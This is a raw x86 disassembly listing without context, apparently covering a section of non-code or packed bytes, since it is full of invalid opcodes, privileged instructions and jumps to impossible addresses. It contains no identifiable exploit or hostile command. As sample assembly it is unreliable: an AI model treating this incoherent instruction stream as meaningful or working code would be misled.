  42bfcd:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  42bfd3:	js     0x8894bd2
  42bfd9:	dec    ebp
  42bfda:	push   ebp
  42bfdb:	mov    edi,DWORD PTR [eax+0xc872fc]
  42bfe1:	lock enter 0xceca,0xf2
  42bfe6:	retf   0x18ce
  42bfe9:	jne    0x42c038
  42bfeb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  42bff1:	enter  0xf0d6,0xca
  42bff5:	retf   0xf2c8
  42bff8:	into   
  42bff9:	out    dx,al
  42bffa:	dec    ebp
  42bffb:	dec    ebp
  42bffc:	jmp    0xff46bf34
  42c001:	xor    eax,DWORD PTR [ebp-0x15]
  42c004:	xor    esi,DWORD PTR [ebx]
  42c006:	mov    esi,DWORD PTR [ebx]
  42c008:	sub    eax,DWORD PTR [ebx]
  42c00a:	add    eax,DWORD PTR [ebx]
  42c00c:	or     bl,dl
  42c00e:	dec    ebp
  42c00f:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  42c015:	xor    eax,DWORD PTR [ebp-0xf00073]
  42c01b:	jb     0x42c062
  42c01d:	add    BYTE PTR [ebx],dh
  42c01f:	dec    ebp
  42c020:	pop    esi
  42c021:	mov    ebp,ebx
  42c023:	cld    
  42c024:	mov    esi,eax
  42c026:	call   0x521117f3
  42c02b:	stc    
  42c02c:	add    eax,0x4572aa
  42c031:	pop    edi
  42c032:	leave  
  42c033:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  42c03a:	in     al,dx
  42c03b:	mov    eax,edi
  42c03d:	xor    eax,0xf8008520
  42c043:	mov    DWORD PTR [ebp-0x14],0xf89c8534
  42c04a:	mov    eax,DWORD PTR [ebp-0x77]
  42c04d:	xor    al,0xf8
  42c04f:	pushf  
  42c050:	inc    ebp
  42c051:	(bad)  
  42c052:	cmp    eax,0x56869ce8
  42c057:	clc    
  42c058:	mov    edi,0x8518e4ec
  42c05e:	jmp    0xf056:0x8b457df8
  42c065:	push   edi
  42c066:	push   edi
  42c067:	push   ecx
  42c068:	push   ecx
  42c069:	push   edi
  42c06a:	xor    eax,esi
  42c06c:	mov    edx,0x32729e
  42c071:	add    ecx,eax
  42c073:	mov    edx,edi
  42c075:	clc    
  42c076:	retf   0xaf45
  42c079:	cmp    eax,0xc78b9ceb
  42c07e:	clc    
  42c07f:	cld    
  42c080:	jne    0x42c09a
  42c082:	xor    ebp,edx
  42c084:	xor    eax,DWORD PTR [ebp+0x3]
  42c087:	or     BYTE PTR [ebx],al
  42c089:	add    BYTE PTR [ebp-0x7747475],al
  42c08f:	hlt    
  42c090:	dec    ebp
  42c091:	dec    ebp
  42c092:	je     0x42c0c7
  42c094:	xor    esi,DWORD PTR [ebx]
  42c096:	xor    eax,DWORD PTR [ebx]
  42c098:	add    eax,DWORD PTR [ebx]
  42c09a:	add    ecx,DWORD PTR [edi]
  42c09c:	rol    ecx,cl
  42c09e:	mov    esi,DWORD PTR [ecx]
  42c0a0:	in     al,dx
  42c0a1:	inc    ebp
  42c0a2:	enter  0xca2b,0x33
  42c0a6:	icebp  
  42c0a7:	mov    DWORD PTR [edx],ecx
  42c0a9:	clc    
  42c0aa:	lock pop ebp
  42c0ac:	enter  0xf2e8,0xfe
  42c0b0:	retf   0xeeff
  42c0b3:	inc    ebp
  42c0b4:	jne    0x42c041
  42c0b6:	mov    edi,eax
  42c0b8:	cld    
  42c0b9:	dec    ebp
  42c0ba:	enter  0xbc89,0x8d
  42c0be:	sahf   
  42c0bf:	sti    
  42c0c0:	xor    bh,bh
  42c0c2:	mov    eax,DWORD PTR [ebp-0xc]
  42c0c5:	mov    esi,DWORD PTR [ebp-0x4]
  42c0c8:	xor    eax,esi
  42c0ca:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9e]
  42c0d1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  42c0d7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  42c0dd:	(bad)  
  42c0de:	push   ebp
  42c0df:	shr    esp,0x4d
  42c0e2:	in     al,dx
  42c0e3:	cmp    eax,DWORD PTR [esi+esi*2]
  42c0e6:	add    BYTE PTR [ebx-0x39ca1bbb],cl
  42c0ec:	pushf  
  42c0ed:	mov    edi,0x85c7f445
  42c0f3:	call   0xf88847f0
  42c0f8:	xor    eax,0x53619cdb
  42c0fd:	dec    ebp
  42c0fe:	inc    ebp
  42c0ff:	mov    esi,DWORD PTR [esi]
  42c101:	clc    
  42c102:	pushf  
  42c103:	into   
  42c104:	mov    ecx,edi
  42c106:	in     al,dx
  42c107:	call   0x8b4b06ca
  42c10c:	pop    es
  42c10d:	or     BYTE PTR [ebx],dh
  42c10f:	or     BYTE PTR [edi+0x8a724d],bh
  42c115:	or     eax,edi
  42c117:	push   ebp
  42c118:	inc    ebp
  42c119:	cmpxchg8b (bad)
  42c11a:	(bad)  
  42c11b:	leave  
  42c11c:	loopne 0x42c0e8
  42c11e:	test   DWORD PTR [ebp-0x8],ecx
  42c121:	mov    eax,DWORD PTR [ebp-0x18]
  42c124:	aad    0x55
  42c126:	xlat   BYTE PTR ds:[ebx]
  42c127:	xor    eax,edi
  42c129:	add    esi,eax
  42c12b:	and    eax,DWORD PTR [eax]
  42c12d:	mov    eax,DWORD PTR [eax]
  42c12f:	(bad)  
  42c130:	leave  
  42c131:	sti    
  42c132:	inc    ebp
  42c133:	dec    DWORD PTR [ebx-0x39cc13ab]
  42c139:	mov    esi,ecx
  42c13b:	clc    
  42c13c:	(bad)  
  42c13d:	dec    ebp
  42c13e:	iret   
  42c13f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  42c145:	jb     0x42c143
  42c147:	add    bh,al
  42c149:	inc    ebp
  42c14a:	(bad)  
  42c14b:	mov    eax,DWORD PTR [ebp-0xc]
  42c14e:	(bad)  
  42c14f:	xabort 0x62
  42c152:	loopne 0x42c121
  42c154:	jmp    FWORD PTR [ebx]
  42c156:	mov    DWORD PTR [ebx],eax
  42c158:	clc    
  42c159:	lock inc ebp
  42c15b:	dec    ebp
  42c15c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  42c162:	loopne 0x42c197
  42c164:	inc    DWORD PTR [ebx]
  42c166:	mov    edi,DWORD PTR [ebx]
  42c168:	hlt    
  42c169:	jne    0x42c1b8
  42c16b:	mov    esi,DWORD PTR [ebx]
  42c16d:	in     al,0x8d
  42c16f:	dec    ebp
  42c170:	or     BYTE PTR [ebx],dh
  42c172:	jb     0x42c177
  42c174:	add    BYTE PTR [edi+0x45],bl
  42c177:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  42c17d:	add    BYTE PTR [ebx],dh
  42c17f:	mov    esi,DWORD PTR [ebx]
  42c181:	mov    ebp,DWORD PTR [ebx]
  42c183:	sbb    BYTE PTR [ebx-0x377403b3],cl
  42c189:	nop
  42c18a:	mov    ecx,0x338b4500
  42c18f:	add    DWORD PTR [ebx],0x70
  42c192:	mov    DWORD PTR [esi-0x8],edx
  42c195:	jne    0x42c1dc
  42c197:	mov    esi,DWORD PTR [esi]
  42c199:	push   edi
  42c19a:	pushf  
  42c19b:	push   edi
  42c19c:	mov    edx,DWORD PTR [ecx-0x15]
  42c19f:	xor    ecx,DWORD PTR [ebx+0x4572e0bb]
  42c1a5:	add    BYTE PTR [ebx],dh
  42c1a7:	retf   
  42c1a8:	add    edx,ecx
  42c1aa:	ror    DWORD PTR [edi],cl
  42c1ac:	mov    DWORD PTR ds:0x7f452dfc,ebp
  42c1b2:	mov    ch,dl
  42c1b4:	mov    BYTE PTR [eax+0xb],dh
  42c1b7:	fimul  WORD PTR [ebp+0x0]
  42c1ba:	mov    ecx,DWORD PTR [ebx+0x55b608f8]
  42c1c0:	xor    esi,DWORD PTR [ebx]
  42c1c2:	mov    DWORD PTR [ebx],esi
  42c1c4:	or     BYTE PTR [ebx],al
  42c1c6:	dec    ebp
  42c1c7:	add    ecx,DWORD PTR [ebx-0x318af7c5]
  42c1cd:	or     edi,0x8c64ca9e
  42c1d3:	out    dx,eax
  42c1d4:	loopne 0x42c1eb
  42c1d6:	(bad)  
  42c1d7:	jmp    0x13ec667
  42c1dc:	retf   0x4d4d
  42c1df:	xor    ecx,DWORD PTR [ebx-0x31c40bfd]
  42c1e5:	je     0x3243608f
  42c1eb:	mov    ecx,DWORD PTR [ecx+0x45450818]
  42c1f1:	mov    DWORD PTR [ebx],esi
  42c1f3:	sbb    BYTE PTR [ecx-0x7472b3],bh
  42c1f9:	mov    eax,ecx
  42c1fb:	fmul   DWORD PTR [ebp+0x45]
  42c1fe:	mov    DWORD PTR ds:0xba459cf0,esi
  42c204:	mov    eax,DWORD PTR [ebp+0x55c6f8f0]
  42c20a:	(bad)  
  42c20b:	mov    ecx,eax
  42c20d:	sbb    BYTE PTR [ecx-0x7474babb],dl
  42c213:	sbb    al,bh
  42c215:	add    dh,0x1
  42c218:	mov    DWORD PTR [eax],0x4dc1005e
  42c21e:	leave  
  42c21f:	mov    eax,DWORD PTR [eax+ebx*1]
  42c222:	push   ebp
  42c223:	mov    esp,ebp
  42c225:	add    DWORD PTR [ebp+0x0],eax
  42c228:	mov    ecx,DWORD PTR [ecx]
  42c22a:	or     BYTE PTR [eax-0x80],cl
  42c22d:	mov    DWORD PTR [ecx],eax
  42c22f:	or     al,0x0
  42c231:	inc    ebp
  42c232:	add    BYTE PTR [ebx],dh
  42c234:	in     al,dx
  42c235:	add    edx,DWORD PTR [ebx-0x77]
  42c238:	mov    esi,esp
  42c23a:	adc    BYTE PTR [ebp+0x16],al
  42c23d:	xor    edi,DWORD PTR [edi+0x7890803]
  42c243:	adc    al,0xcf
  42c245:	inc    ebp
  42c246:	sahf   
  42c247:	mov    esi,DWORD PTR [edx]
  42c249:	push   eax
  42c24a:	add    ebp,eax
  42c24c:	cmp    ecx,DWORD PTR [ecx+0x4581d075]
  42c252:	sahf   
  42c253:	mov    esp,DWORD PTR [eax+edi*1+0x42]
  42c257:	dec    ebp
  42c258:	fwait
  42c259:	dec    eax
  42c25a:	jmp    0xcdc6a0
  42c25f:	or     al,0x4d
  42c261:	sbb    BYTE PTR [ebx-0x3074f3c0],cl
  42c267:	or     al,0xd7
  42c269:	dec    ecx
  42c26a:	retf   
  42c26b:	dec    eax
  42c26c:	rcl    eax,cl
  42c26e:	retf   0xfc8
  42c271:	inc    ebp
  42c272:	or     eax,0x7f382d8b
  42c277:	sar    esp,0x3
  42c27a:	lahf   
  42c27b:	inc    eax
  42c27c:	mov    ebp,0x8b180089
  42c281:	inc    ebp
  42c282:	or     BYTE PTR [ebx],dh
  42c284:	iret   
  42c285:	add    ecx,ebx
  42c287:	mov    ecx,eax
  42c289:	adc    al,0x84
  42c28b:	inc    ebp
  42c28c:	add    al,0x33
  42c28e:	add    BYTE PTR [ebx],al
  42c290:	dec    ebp
  42c291:	mov    DWORD PTR [ecx+0x4d45dc14],ecx
  42c297:	mov    ecx,DWORD PTR [ebx+0x6c714d4]
  42c29d:	ret    
  42c29e:	inc    ebp
  42c29f:	add    edi,eax
  42c2a1:	push   ebp
  42c2a2:	or     bh,al
  42c2a4:	test   DWORD PTR [eax+edi*8],edx
  42c2a7:	test   DWORD PTR [eax+edi*8],esi
  42c2aa:	pushf  
  42c2ab:	inc    ebp
  42c2ac:	mov    DWORD PTR [edx],esi
  42c2ae:	lock pushf 
  42c2b0:	inc    ebp
  42c2b1:	(bad)  
  42c2b2:	mov    DWORD PTR [eax+ebx*1],edx
  42c2b5:	test   DWORD PTR [ebp-0x8],eax
  42c2b8:	mov    eax,DWORD PTR [ebp-0x70]
  42c2bb:	mov    eax,DWORD PTR [eax]
  42c2bd:	sbb    BYTE PTR [ebx-0x2b3c7639],cl
  42c2c3:	scas   eax,DWORD PTR es:[edi]
  42c2c4:	dec    ebp
  42c2c5:	mov    ecx,DWORD PTR [ebx+0x559008]
  42c2cb:	xor    ecx,DWORD PTR [ebx+0x3c11038d]
  42c2d1:	jb     0x42c320
  42c2d3:	add    BYTE PTR [ebx-0x387cf73f],cl
  42c2d9:	add    eax,ebx
  42c2db:	add    BYTE PTR [ebp+0x45],al
  42c2de:	mov    esi,DWORD PTR [ebx]
  42c2e0:	or     BYTE PTR [ebx],al
  42c2e2:	(bad)  
  42c2e3:	mov    ebx,eax
  42c2e5:	adc    al,0x45
  42c2e7:	inc    ebp
  42c2e8:	mov    eax,DWORD PTR [ebx]
  42c2ea:	or     al,0xdc
  42c2ec:	inc    eax
  42c2ed:	inc    ebp
  42c2ee:	cmp    edi,0xc
  42c2f1:	hlt    
  42c2f2:	inc    ebp
  42c2f3:	jne    0x42c280
  42c2f5:	mov    ecx,DWORD PTR [esp+ecx*1]
  42c2f8:	inc    eax
  42c2f9:	bound  ecx,QWORD PTR [ebx-0x7a76f301]
  42c2ff:	clc    
  42c300:	push   esp
  42c301:	inc    ebp
  42c302:	inc    ebp
  42c303:	cmp    eax,0x8b8b9c74
  42c308:	cmp    al,ah
  42c30a:	dec    ebp
  42c30b:	(bad)  
  42c30c:	mov    eax,ebx
  42c30e:	push   esp
  42c30f:	(bad)  
  42c310:	idiv   DWORD PTR [eax-0x87417dd]
  42c316:	or     al,0xff
  42c318:	inc    eax
  42c319:	inc    ebp
  42c31a:	add    eax,DWORD PTR [ebp-0x74748b15]
  42c320:	push   esp
  42c321:	loopne 0x42c368
  42c323:	(bad)  
  42c324:	mov    eax,ebx
  42c326:	or     bh,bh
  42c328:	xbegin 0x508808f1
  42c32e:	mov    ebx,esp
  42c330:	or     bh,bh
  42c332:	(bad)  
  42c333:	mov    eax,ebx
  42c335:	hlt    
  42c336:	inc    ebp
  42c337:	inc    ebp
  42c338:	mov    ecx,DWORD PTR [ebx+0x4d4de008]
  42c33e:	xor    ebp,DWORD PTR [ebx]
  42c340:	add    ecx,DWORD PTR [ecx+0x4589e089]
  42c346:	adc    al,0x8b
  42c348:	inc    ebp
  42c349:	clc    
  42c34a:	xor    eax,DWORD PTR [eax-0x64]
  42c34d:	add    eax,edi
  42c34f:	or     al,0x14
  42c351:	dec    ebp
  42c352:	test   DWORD PTR [ebx],edi
  42c354:	clc    
  42c355:	jb     0x42c39c
  42c357:	mov    esi,DWORD PTR [ecx]
  42c359:	clc    
  42c35a:	pushf  
  42c35b:	inc    eax
  42c35c:	mov    ecx,DWORD PTR [ebx+0x414df8f0]
  42c362:	xor    ecx,DWORD PTR [ebx-0x3ef01ffd]
  42c368:	shr    esi,0x4d
  42c36b:	add    BYTE PTR [ebx-0x30002f96],cl
  42c371:	hlt    
  42c372:	mov    WORD PTR [ebp-0x62],es
  42c375:	push   eax
  42c376:	xor    dl,BYTE PTR [ebx+edi*1-0x5347f001]
  42c37d:	test   DWORD PTR [eax],eax
  42c37f:	clc    
  42c380:	mov    eax,DWORD PTR [ebp+0x8]
  42c383:	mov    edi,0x4585c3c8
  42c389:	clc    
  42c38a:	mov    eax,DWORD PTR [ebp+0x18]
  42c38d:	xor    eax,DWORD PTR [ebp-0x64]
  42c390:	mov    edi,eax
  42c392:	hlt    
  42c393:	shl    BYTE PTR [ebp-0x7b],0x8b
  42c397:	clc    
  42c398:	fmul   QWORD PTR [ebp+0x4d]
  42c39b:	mov    eax,ebp
  42c39d:	in     al,dx
  42c39e:	icebp  
  42c39f:	dec    ebp
  42c3a0:	dec    DWORD PTR [ecx+0x4dc7e845]
  42c3a6:	loopne 0x42c331
  42c3a8:	test   eax,edi
  42c3aa:	clc    
  42c3ab:	dec    ebp
  42c3ac:	inc    ebp
  42c3ad:	mov    DWORD PTR [ebx],esi
  42c3af:	in     al,0x3
  42c3b1:	dec    ebp
  42c3b2:	push   eax
  42c3b3:	xor    eax,DWORD PTR [ebp+0x3]
  42c3b6:	push   eax
  42c3b7:	mov    DWORD PTR [eax-0x20],edx
  42c3ba:	push   edi
  42c3bc:	mov    eax,DWORD PTR [eax]
  42c3be:	clc    
  42c3bf:	cmp    eax,0xf84e85c0
  42c3c4:	inc    ebp
  42c3c5:	test   BYTE PTR [ebx],dh
  42c3c7:	add    DWORD PTR [ebx],eax
  42c3c9:	add    BYTE PTR [eax+0x4d],dl
  42c3cc:	jne    0x42c401
  42c3ce:	lea    ecx,[ebx-0x7617fc48]
  42c3d4:	cmc    
  42c3d5:	adc    al,0xff
  42c3d7:	inc    ebp
  42c3d8:	inc    ebp
  42c3d9:	xor    ecx,DWORD PTR [ecx+0x4530e08d]
  42c3df:	jb     0x42c36c
  42c3e1:	add    ah,bl
  42c3e3:	inc    ebp
  42c3e4:	ror    DWORD PTR [ebx+0x4d8bf045],0xf8
  42c3eb:	xor    ecx,DWORD PTR [ebp+0x3]
  42c3ee:	mov    edi,DWORD PTR [ebx]
  42c3f0:	adc    BYTE PTR [ebp+0x41],dh
  42c3f3:	mov    ecx,DWORD PTR [ebx-0x37381ff8]
  42c3f9:	ret    
  42c3fa:	push   ss
  42c3fb:	push   0x45
  42c3fd:	lea    ecx,[ebx+0x4de80cac]
  42c403:	cli    
  42c404:	add    edi,edi
  42c406:	or     BYTE PTR [ebp+0x4d],al
  42c409:	mov    ebp,DWORD PTR [ebx]
  42c40b:	xor    ebp,ecx
  42c40d:	mov    al,BYTE PTR [edx]
  42c40f:	add    eax,0xc7200
  42c414:	jne    0x42c463
  42c416:	lea    esi,[ebx]
  42c418:	lods   al,BYTE PTR ds:[esi]
  42c419:	psubsb mm0,mm0
  42c41c:	cmc    
  42c41d:	retf   
  42c41e:	inc    ecx
  42c420:	xor    eax,0x89019c84
  42c425:	add    ah,cl
  42c427:	inc    ebp
  42c428:	inc    ebp
  42c429:	mov    esi,DWORD PTR [ebx+esi*1]
  42c42c:	pushf  
  42c42d:	mov    al,bh
  42c42f:	add    eax,0x8572c4
  42c434:	clc    
  42c435:	dec    ebp
  42c436:	inc    ebp
  42c437:	xor    esi,DWORD PTR [edx]
  42c439:	setl   al
  42c43c:	(bad)  
  42c43d:	retf   
  42c43e:	int3   
  42c43f:	ror    DWORD PTR [ebp-0x7c],0x8d
  42c443:	add    eax,ecx
  42c445:	add    BYTE PTR [ebp+0x45],cl
  42c448:	lea    ecx,[ebx-0x75b2cc3c]
  42c44e:	lea    eax,ds:0x4d72c0
  42c454:	mov    ecx,DWORD PTR [ebp+0x8]
  42c457:	xor    ecx,edi
  42c459:	bswap  ebx
  42c45b:	ror    BYTE PTR [ebp-0x35],0xe9
  42c45f:	rol    DWORD PTR [ecx],0x84
  42c462:	add    BYTE PTR [ecx],al
  42c464:	xor    eax,DWORD PTR [eax]
  42c466:	pushf  
  42c467:	inc    ebp
  42c468:	jnp    0x8a42f86c
  42c46e:	mov    eax,DWORD PTR ds:0xcf72f0
  42c474:	lock dec ebp
  42c476:	retf   
  42c477:	xor    ecx,DWORD PTR [ebp+0xf]
  42c47a:	mov    eax,eax
  42c47c:	loopne 0x42c449
  42c47e:	test   ecx,0x19e8484
  42c484:	xor    al,BYTE PTR [eax]
  42c486:	mov    DWORD PTR [ebp-0x20],eax
  42c489:	mov    eax,DWORD PTR [ebp+0x33]
  42c48c:	mov    ecx,DWORD PTR [edx+0x72c705e0]
  42c492:	ret    
  42c493:	add    al,cl
  42c495:	dec    ebp
  42c496:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42c49c:	add    ecx,DWORD PTR ds:0xc7250
  42c4a2:	inc    ebp
  42c4a3:	rcl    DWORD PTR [eax+0x4d],0x5f
  42c4a7:	mov    edi,edi
  42c4a9:	xor    ecx,DWORD PTR [ebx+0xdec8a]
  42c4af:	jb     0x42c478
  42c4b1:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  42c4b8:	mov    esi,DWORD PTR [ebx]
  42c4ba:	or     BYTE PTR [edx+0x72b60dcf],cl
  42c4c0:	add    eax,DWORD PTR [eax]
  42c4c2:	cmp    ecx,eax
  42c4c4:	jne    0x42c542
  42c4ca:	mov    eax,DWORD PTR [ebp-0x18]
  42c4cd:	mov    eax,DWORD PTR [eax]
  42c4cf:	xor    eax,edi
  42c4d1:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  42c4d8:	mov    ecx,DWORD PTR [ebp+0x8]
  42c4db:	mov    ecx,edi
  42c4dd:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42c4e3:	jb     0x42c4f4
  42c4e5:	add    BYTE PTR [eax-0x3f],bl
  42c4e8:	add    BYTE PTR [ebp-0x75],cl
  42c4eb:	mov    edi,eax
  42c4ed:	xor    eax,DWORD PTR [eax]
  42c4ef:	mov    al,bh
  42c4f1:	or     eax,0x4a7284
  42c4f6:	xor    al,cl
  42c4f8:	mov    ecx,DWORD PTR [ebp+0x8]
  42c4fb:	mov    ecx,edi
  42c4fd:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42c503:	jb     0x42c514
  42c505:	add    BYTE PTR [eax],bh
  42c507:	enter  0x8500,0x8b
  42c50b:	add    ah,ah
  42c50d:	add    BYTE PTR [eax],al
  42c50f:	inc    ebp
  42c510:	(bad)  
  42c511:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4a]
  42c518:	mov    esi,DWORD PTR [edx+0x8]
  42c51b:	add    bh,cl
  42c51d:	dec    ebp
  42c51e:	mov    dh,0x8b
  42c520:	add    esi,DWORD PTR [ebx]
  42c522:	cmp    ecx,DWORD PTR [edx+0x72180d0f]
  42c528:	add    BYTE PTR [eax],al
  42c52a:	mov    eax,ecx
  42c52c:	call   0xc7cdc57e
  42c531:	xor    eax,DWORD PTR [edx+ecx*4+0x72320d4a]
  42c538:	mov    eax,DWORD PTR [eax]
  42c53a:	in     al,dx
  42c53b:	ror    DWORD PTR [ecx],0x4d
  42c53e:	iret   
  42c53f:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4a]
  42c546:	xor    dh,BYTE PTR [edx-0x75]
  42c549:	add    al,bh
  42c54b:	enter  0x5009,0xcf
  42c54f:	inc    ebp
  42c550:	mov    WORD PTR [ebx-0x75cdccb6],cs
  42c556:	or     al,BYTE PTR ds:0xec728b
  42c55c:	or     DWORD PTR [ebp-0x31],ecx
  42c55f:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4e]
  42c566:	cmp    dh,BYTE PTR [edx+0xf]
  42c569:	add    ah,dl
  42c56b:	rol    DWORD PTR [eax],0x4d
  42c56e:	mov    ecx,DWORD PTR [ebx-0x75ffcc08]
  42c574:	(bad)  
  42c575:	or     eax,0x4a7284
  42c57a:	xor    al,cl
  42c57c:	mov    ecx,DWORD PTR [ebp-0x18]
  42c57f:	mov    ecx,DWORD PTR [ecx]
  42c581:	xor    ecx,edi
  42c583:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724a]
  42c58a:	xor    cl,al
  42c58c:	mov    edx,DWORD PTR [eax]
  42c58e:	in     al,0x45
  42c590:	or     DWORD PTR [eax-0x31],edx
  42c593:	mov    ds:0x8b4aff8c,eax
  42c598:	xor    dh,BYTE PTR [edx+ecx*1-0x17f5743f]
  42c59f:	inc    ebp
  42c5a0:	or     DWORD PTR [ebx],esi
  42c5a2:	iret   
  42c5a3:	add    ecx,DWORD PTR [ecx+ecx*4+0x4532144e]
  42c5aa:	cmp    dh,BYTE PTR [ebx]
  42c5ac:	jge    0x7242f642
  42c5b2:	mov    eax,DWORD PTR [eax]
  42c5b4:	in     al,0xc7
  42c5b6:	add    BYTE PTR [ebp-0x39],cl
  42c5b9:	mov    eax,DWORD PTR [esp+edx*1-0x34cd30b6]
  42c5c0:	mov    edx,ecx
  42c5c2:	clc    
  42c5c3:	test   BYTE PTR [ecx],cl
  42c5c5:	std    
  42c5c6:	iret   
  42c5c7:	dec    DWORD PTR [ebp+eax*2+0x14328b4a]
  42c5ce:	xor    al,bh
  42c5d0:	mov    eax,ebx
  42c5d2:	in     al,dx
  42c5d3:	enter  0x1109,0xcf
  42c5d7:	inc    ebp
  42c5d8:	mov    WORD PTR [ebx-0x38cde7b6],cs
  42c5de:	or     al,BYTE PTR [ebx+ecx*4+0x932f89e]
  42c5e5:	jmp    0x42c5b6
  42c5e7:	push   0xffffff8c
  42c5e9:	dec    DWORD PTR [esi-0xc]
  42c5ec:	xor    al,BYTE PTR [ebp+0x3a]
  42c5ef:	push   eax
  42c5f0:	jne    0x42c60c
  42c5f2:	mov    edi,edi
  42c5f4:	in     al,0x8b
  42c5f6:	add    BYTE PTR [eax],cl
  42c5f8:	(bad)  
  42c5f9:	dec    ebp
  42c5fa:	test   BYTE PTR [ebx],dh
  42c5fc:	dec    edx
  42c5fd:	add    esi,DWORD PTR [edx]
  42c5ff:	cmp    ecx,DWORD PTR [ebx+0x98bec74]
  42c605:	or     bh,cl
  42c607:	(bad)  
  42c608:	mov    ebx,es
  42c60a:	dec    edx
  42c60b:	push   0x32
  42c60d:	lea    esi,[edx]
  42c60f:	xchg   esp,eax
  42c610:	mov    ebp,eax
  42c612:	call   0xd041d00f
  42c617:	inc    ebp
  42c618:	mov    WORD PTR [ebx+0x4532184a],es
  42c61e:	or     bh,bh
  42c620:	mov    ebp,DWORD PTR [eax-0x74f68a1c]
  42c626:	iret   
  42c627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c628:	mov    WORD PTR [ebp+0x4e],es
  42c62b:	push   eax
  42c62c:	xor    bl,dh
  42c62e:	cmp    bh,bh
  42c630:	jne    0x42c5bd
  42c632:	lea    ecx,[eax]
  42c634:	lods   al,BYTE PTR ds:[esi]
  42c635:	dec    ebp
  42c636:	call   0xff46c06e
  42c63b:	cmp    ecx,DWORD PTR [ebp+0x74]
  42c63e:	cmp    ebp,DWORD PTR [edx+0x74]
  42c641:	dec    DWORD PTR [ebx-0x38baf758]
  42c647:	add    eax,ebx
  42c649:	fadd   DWORD PTR [ebp-0x18]
  42c64c:	mov    edi,eax
  42c64e:	lock inc edi
  42c651:	inc    ebp
  42c652:	test   BYTE PTR [ebx+0x832a89e],cl
  42c658:	xor    eax,DWORD PTR [ebp-0x75]
  42c65b:	add    ecx,DWORD PTR [eax]
  42c65d:	sbb    BYTE PTR [ebp+0x45],dl
  42c660:	xor    ecx,DWORD PTR [ebx+0x4d3bf003]
  42c666:	rdpmc  
  42c668:	test   DWORD PTR [ebx],0xc18b0fff
  42c66e:	or     BYTE PTR [ebp+0x4d],cl
  42c671:	mov    esi,DWORD PTR [ebx]
  42c673:	rol    BYTE PTR [ebx],1
  42c675:	iret   
  42c676:	cmp    ecx,DWORD PTR [ebp+esi*2-0xfcd7462]
  42c67d:	cmp    ecx,DWORD PTR [ebp+0xf]
  42c680:	xor    edx,DWORD PTR [edi-0x73]
  42c683:	dec    DWORD PTR [eax]
  42c685:	mov    esi,DWORD PTR [edx+0x10]
  42c688:	add    BYTE PTR [ebp+0x77],al
  42c68b:	mov    DWORD PTR [eax],ebx
  42c68d:	jmp    0x42c704
  42c68f:	or     DWORD PTR [ebp-0x179b6b62],0xff65f3bf
  42c699:	pop    edi
  42c69a:	inc    ebp
  42c69b:	pop    ebx
  42c69c:	mov    eax,edx
  42c69e:	loopne 0x42c6a0
  42c6a0:	(bad)  
  42c6a1:	mov    eax,ebx
  42c6a3:	push   ecx
  42c6a4:	ror    DWORD PTR [ebx+0x4d450813],0x33
  42c6ab:	push   esi
  42c6ac:	add    edi,DWORD PTR [edi+0x7180850]
  42c6b2:	inc    ebp
  42c6b3:	(bad)  
  42c6b4:	push   eax
  42c6b5:	sahf   
  42c6b6:	dec    edi
  42c6b7:	xor    bh,bh
  42c6b9:	add    ecx,DWORD PTR [ebx-0x3f740b77]
  42c6bf:	adc    al,0x89
  42c6c1:	adc    BYTE PTR [ecx+eax*1],0x75
  42c6c5:	add    bh,bh
  42c6c7:	or     BYTE PTR [eax*2-0x6bfc74bb],dl
  42c6ce:	fadd   DWORD PTR [eax]
  42c6d0:	call   0xff46b960
  42c6d5:	cmp    al,0x45
  42c6d7:	dec    ebp
  42c6d8:	mov    ecx,DWORD PTR [ebx+0xc7d8e0]
  42c6de:	ret    
  42c6df:	mov    eax,ecx
  42c6e1:	adc    al,0x11
  42c6e3:	add    al,0x0
  42c6e5:	add    BYTE PTR [ebp+0x0],dh
  42c6e8:	mov    edi,edi
  42c6ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c6eb:	push   eax
  42c6ec:	inc    ebp
  42c6ed:	add    BYTE PTR [eax-0x2f],dl
  42c6f0:	adc    eax,0x8b45ff03
  42c6f5:	xor    edx,esp
  42c6f7:	add    ecx,DWORD PTR [ebp-0x77]
  42c6fa:	add    esp,edi
  42c6fc:	mov    eax,DWORD PTR [ebp-0x58]
  42c6ff:	inc    DWORD PTR [ebp+0x14]
  42c702:	mov    DWORD PTR [ebp+0x18],eax
  42c705:	push   eax
  42c706:	inc    ebp
  42c707:	dec    DWORD PTR [ebx-0x388ae7f4]
  42c70d:	call   0xfff2c1d5
  42c712:	mov    eax,DWORD PTR [ebp+0x8]
  42c715:	mov    edx,DWORD PTR [ebp+0x33]
  42c718:	xor    eax,DWORD PTR [ebx]
  42c71a:	lea    edi,[ebx]
  42c71c:	adc    DWORD PTR [edx+esi*2-0x75],esi
  42c720:	add    BYTE PTR [ecx+eax*8],cl
  42c723:	dec    ebp
  42c724:	xor    BYTE PTR [ebx],0xfc
  42c727:	add    edi,edi
  42c729:	pcmpeqw mm0,QWORD PTR [ebp-0x75]
  42c72d:	mov    eax,ebx
  42c72f:	pop    edi
  42c730:	push   es
  42c731:	leave  
  42c732:	or     dl,BYTE PTR [eax]
  42c734:	xor    eax,0x7fec2d55
  42c739:	in     al,0xec
  42c73b:	adc    DWORD PTR [edx+0x14],0x5e
  42c73f:	xor    eax,0x53149cc9
  42c744:	push   ebp
  42c745:	dec    esp
  42c746:	in     al,dx
  42c747:	or     BYTE PTR [ecx+0x57],dl
